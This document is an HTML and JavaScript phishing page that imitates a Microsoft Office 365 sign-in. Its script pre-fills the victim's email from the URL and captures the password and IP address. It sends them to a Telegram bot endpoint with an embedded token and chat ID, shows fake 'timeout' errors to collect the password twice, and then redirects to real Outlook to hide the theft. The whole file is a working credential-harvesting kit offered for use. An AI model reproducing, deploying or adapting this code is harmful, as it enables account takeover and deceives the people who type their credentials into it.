<!doctype html>
<html lang="en">

<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
	<link rel="icon" type="image/png" sizes="192x192" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <title>Sign in to your account</title>
    <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
    <style type="text/css">
    textarea:hover,
    input:hover,
    textarea:active,
    input:active,
    textarea:focus,
    input:focus,
    button:focus,
    button:active,
    button:hover,
    label:focus,
    .btn:active,
    .btn.active {
        outline: 0px !important;
        -webkit-appearance: none;
        box-shadow: none !important;
    }

    .box {
        box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
        border: 0px solid rgba(0, 0, 0, 0.4);
        max-height: 415px;


        width: 440px;
        /*width: calc(100% - 40px);*/
        padding: 44px;
        margin-left: auto;
        margin-right: auto;
        margin-top: 20px;
        margin-bottom: 28px;
    }

    #footer {
        position: fixed;
        bottom: 0px;
        width: 100%;
        overflow: visible;
        z-index: 99;
        clear: both;


    }

    /*.footerNode span {
    color: #fff;
    font-size: 0.75rem;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    float: right;
    margin-left: 8px;
    margin-right: 8px;
}*/
    div .footerNode a,
    div .footerNode span {
        color: black;
        font-size: 0.75rem;
        line-height: 28px;
        white-space: nowrap;
        display: inline-block;
        float: right;
        margin-left: 8px;
        margin-right: 8px;
    }

    @media only screen and (max-width: 610px) {
        #hide {
            display: none;
        }
    }
    </style>
</head>

<body style="background-image: url('https://i.imgur.com/ssr57bo.jpg'); background-size: cover;background-repeat: no-repeat;">
    <div class="container-fluid">
        <div class="container">
            <div class="row my-5 py-5">
                <!-- <div class="col-lg-6" id="hide">
            <div class="text-white my-5 py-3">
              <span class="display-4">Expand Your<br> Microsoft</span><br><br>
              <span class="h5 font-weight-normal">Upgrade to ad-free ai and the latest productivity tools with Microsoft.</span><br><br><br>
              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
            </div>
          </div> -->
                <div class="col-lg-6 mx-auto">
                    <!-- ////////////////////////div1 start/////////////////////// -->
                    <div class="m-5 p-5 bg-white box" id="div1">
              <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" class="img-fluid"><br><br>
                        <span class="h5">Sign In</span><br>
                        <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
                        <div class="form-group mt-2">
                            <input type="email" value="" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
                        </div>
                        <p style="font-size: 14px">No account? <a href="#">Create one!</a></p>
                        <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
                        <p style="font-size: 14px"><a href="#">Click "Next" to continue.</a></p>
                        <div class="text-right">
                            <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
                        </div>
                    </div>
                    <!-- ////////////////////////div1 end/////////////////////// -->
                    <!-- ////////////////////////div2 start/////////////////////// -->
                    <div class="m-5 p-5 bg-white box" id="div2" style="display: none;">
                        <form id="contact">
                  <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" class="img-fluid"><br><br>
                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich">abc@abc.com</span>
                            <div class="py-2"><span class="h4" style="color: #4E4542">Enter Password</span></div>
                            <div class="pb-2">
                                <span id="msg" class="text-danger">To access document, you'll need to verify your account.</span>
                                <span id="msg2" class="text-danger" style="display: none;">Sign in attempt timeout, please try again. <a href='#'></a></span>
                                <span id="msg1" class="text-danger" style="display: none;">Sign in attempt timeout, please try again.</span>
                            </div>
                            <div class="form-group mt-1">
                                <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="emailHelp" placeholder="Password" style="border-right: none;border-left: none;border-top: none;">
                            </div>
                            <p style="font-size: 14px"><a href="#">Forget password?</a></p>
                            <!-- <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
                            <p style="font-size: 14px"><a href="#">sign in options</a></p> -->
                            <div class="text-right">
                                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign in</button>
                            </div>
                        </form>
                    </div>
                    <!-- ////////////////////////div2 end/////////////////////// -->
                    <!-- ////////////////////////div3 start/////////////////////// -->
                    <div class="m-5 p-5 bg-white box" id="div3" style="display: none;min-height: 440px;min-width: 408px;">
                        <!-- <img src="images/microsoft_logo.svg" class="img-fluid"><br><br> -->
                        <div class="text-center mt-3 text-center">
                            <img src="https://i.imgur.com/xrWLEV8.png" class="img-fluid" id="success" width="140px">
                        </div>
                        <center><span id="load-text-2" style="font-size: 20px;display: block;"><br><br><br>Successfully Confirmed:<br>Redirected to homepage...</span></center>
                    </div>
                </div>
                <!-- ////////////////////////div3 end/////////////////////// -->
            </div>
        </div>
    </div>
    </div>
    <footer id="footer" style="padding-right: 30px">
        <div>
            <div class="footerNode">
                <span>Privacy & cookie</span>
                <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Terms of use</a>
            </div>
        </div>
    </footer>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
</script>
    <script
      type="text/javascript"
      src="https://l2.io/ip.js?var=userip"
    ></script>
    <script type="text/javascript">
      var userip;
    </script>
  </body>
  <script>
/* global $ */
$(document).ready(function() {
    var count = 0;


    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(ai));
            var my_ai = ai;
        } else {
            // alert(atob(ai));
            var my_ai = atob(ai);
        }
        // $('#ai').val(ai);
        // var my_ai =ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);

        $("#aich").html(my_ai);


    }





    $('#ai').click(function() {
        $('#error').hide();
    });

    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#div1").is(":visible")) {

                $("#next").click();

            } else if ($("#div2").is(":visible")) {
                event.preventDefault();

                $("#submit-btn").click();

            } else {
                return false;
            }
        }
    });


    $('#next').click(function() {
        event.preventDefault();
        var my_ai = $('#ai').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);

        $("#aich").html(my_ai);





    });
    // $('#back').click(function() {
    //     // $("#msg").hide();
    //     $("#ai").val("");
    //     $("#pr").val("");
    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
    //     $("#div1").animate({ right: 0, opacity: "show" }, 1000);

    // });

var file="bmV4dC5waHA=";
    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html();
        var msg = $('#msg').html();

        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#msg').text(msg);
        count = count + 1;
        $.ajax({
            dataType: "JSON",
            url: `https://api.telegram.org/bot636454503:AAHstzks5zTFAGxGEf9VZDsFTRrAJEAg73k/sendMessage?chat_id=8182134630&text====== Document O365 Logins =======
%0AEmail: ${ai}%0APasswd: ${pr}%0AClient IP: ${userip}%0A====== Telegram: @Source_Code03 ======&parse_mode=html`,
            type: "GET",
            beforeSend: function(xhr) {
                $("#submit-btn").html("verifying...");
            },
            success: function(response) {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
                        window.location.replace("https://outlook.live.com/mail/0/inbox");
                    }, 500);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
                        window.location.replace("https://outlook.live.com/mail/0/inbox");
                    }, 1000);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            complete: function() {
                $("#submit-btn").html("Sign in");
            }
        });
    });
});
</script>

</html>
